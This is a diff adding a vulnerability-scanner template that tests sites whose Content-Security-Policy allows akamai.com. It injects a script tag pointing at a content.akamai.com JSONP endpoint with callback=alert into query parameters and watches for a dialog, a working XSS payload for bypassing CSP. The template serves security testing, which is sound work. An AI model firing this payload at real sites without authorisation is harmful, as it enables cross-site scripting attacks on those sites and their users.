@@ -1,0 +1,55 @@
+id: akamai-content-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Akamai Content
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,akamai-content,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "akamai.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: akamai_content_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "akamai_content_csp_xss == true"
+# digest: 490a0046304402204eaef65480fae7b349d94f84b2f0f4048e2254364c98c6dc8c3eaa17664a06000220154fec4dc623c823e73f2915b076b477da8382cea237514d7d5070ed035a589f:922c64590222798bb761d5b6d8e72950
